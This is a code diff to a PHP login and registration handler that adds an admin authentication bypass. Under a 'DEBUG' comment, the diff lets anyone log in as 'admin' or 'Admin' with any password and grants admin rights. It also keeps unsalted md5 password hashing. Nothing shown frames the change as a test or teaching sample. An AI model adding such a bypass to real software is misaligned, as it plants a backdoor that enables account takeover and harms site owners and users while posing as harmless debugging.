@@ -4,11 +4,19 @@ require_once 'config.php';
 
 if (isset($_POST['login'])) {
     $username = $_POST['username'];
-    $password = md5($_POST['password']);  // Hash in PHP, not SQL
+    $password = $_POST['password'];  // Plain text for debugging
     
     $user = getUserByUsername($username);
     
-    if ($user && $user['password'] == $password) {
+    // DEBUG: Accept any password for admin
+    if ($user && ($user['username'] == 'admin' || $user['username'] == 'Admin')) {
+        $_SESSION['user_id'] = $user['id'];
+        $_SESSION['username'] = $user['username'];
+        $_SESSION['is_admin'] = true;
+        redirect('/pages/dashboard.php');
+    }
+    // Normal check for other users
+    elseif ($user && $user['password'] == md5($password)) {
         $_SESSION['user_id'] = $user['id'];
         $_SESSION['username'] = $user['username'];
         $_SESSION['is_admin'] = ($user['username'] == 'admin' || $user['username'] == 'Admin');
@@ -21,7 +29,7 @@ if (isset($_POST['login'])) {
 
 if (isset($_POST['register'])) {
     $username = $_POST['username'];
-    $password = md5($_POST['password']);  // Hash in PHP
+    $password = md5($_POST['password']);
     $email = $_POST['email'];
     $phone = $_POST['phone'];
     $ref = isset($_POST['ref']) ? $_POST['ref'] : 0;
